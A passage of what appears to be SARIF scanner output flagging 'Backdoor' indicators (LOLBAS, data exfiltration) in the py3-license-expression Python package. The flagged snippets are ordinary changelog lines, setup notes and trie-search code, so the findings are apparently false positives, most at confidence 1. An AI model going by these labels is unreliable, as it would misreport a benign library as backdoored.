                    "text": "\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n",
                    "rendered": {
                      "text": "\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n",
                      "markdown": "`\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/METADATA"
                },
                "region": {
                  "startLine": 278,
                  "startColumn": 55,
                  "endLine": 278,
                  "endColumn": 63,
                  "snippet": {
                    "text": "- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n",
                    "rendered": {
                      "text": "- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n",
                      "markdown": "`- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 1,
                  "endLine": 101,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n",
                    "rendered": {
                      "text": "\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n",
                      "markdown": "`\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 1,
                  "endLine": 45,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n",
                    "rendered": {
                      "text": "This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n",
                      "markdown": "`This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 1,
                  "endLine": 36,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n",
                    "rendered": {
                      "text": "This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n",
                      "markdown": "`This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 1,
                  "endLine": 26,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n",
                    "rendered": {
                      "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n",
                      "markdown": "`This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 1,
                  "endLine": 17,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n",
                    "rendered": {
                      "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n",
                      "markdown": "`This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 1,
                  "endLine": 9,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n",
                    "rendered": {
                      "text": "\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n",
                      "markdown": "`\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 23,
                  "endLine": 87,
                  "snippet": {
                    "text": "~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n",
                    "rendered": {
                      "text": "~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n",
                      "markdown": "`~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 74,
                  "endLine": 335,
                  "endColumn": 78,
                  "snippet": {
                    "text": "\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n",
                    "rendered": {
                      "text": "\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n",
                      "markdown": "`\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 74,
                  "endLine": 542,
                  "snippet": {
                    "text": "        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n",
                    "rendered": {
                      "text": "        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n",
                      "markdown": "`        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 540,
                  "startColumn": 50,
                  "endLine": 540,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                    "rendered": {
                      "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                      "markdown": "`    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 540,
                  "startColumn": 15,
                  "endLine": 540,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                    "rendered": {
                      "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                      "markdown": "`    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 15,
                  "endLine": 245,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n",
                    "rendered": {
                      "text": "        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n",
                      "markdown": "`        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 44,
                  "endLine": 241,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n",
                    "rendered": {
                      "text": "            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n",
                      "markdown": "`            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 15,
                  "endLine": 234,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n",
                    "rendered": {
                      "text": "        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n",
                      "markdown": "`        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 7,
                  "endLine": 210,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n",
                    "rendered": {
                      "text": "        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n",
                      "markdown": "`        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 7,
                  "endLine": 159,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n",
                    "rendered": {
                      "text": "        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n",
                      "markdown": "`        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 14,
                  "endLine": 151,
                  "snippet": {
                    "text": "                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n",
                    "rendered": {
                      "text": "                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n",
                      "markdown": "`                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 15,
                  "endLine": 147,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n",
                    "rendered": {
                      "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n",
                      "markdown": "`        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 7,
                  "endLine": 144,
                  "endColumn": 13,
                  "snippet": {
                    "text": "            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                    "rendered": {
                      "text": "            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                      "markdown": "`            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 70,
                  "endLine": 137,
                  "endColumn": 76,
                  "snippet": {
                    "text": "    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n",
                    "rendered": {
                      "text": "    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n",
                      "markdown": "`    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 16,
                  "endLine": 136,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n",
                    "rendered": {
                      "text": "\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n",
                      "markdown": "`\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
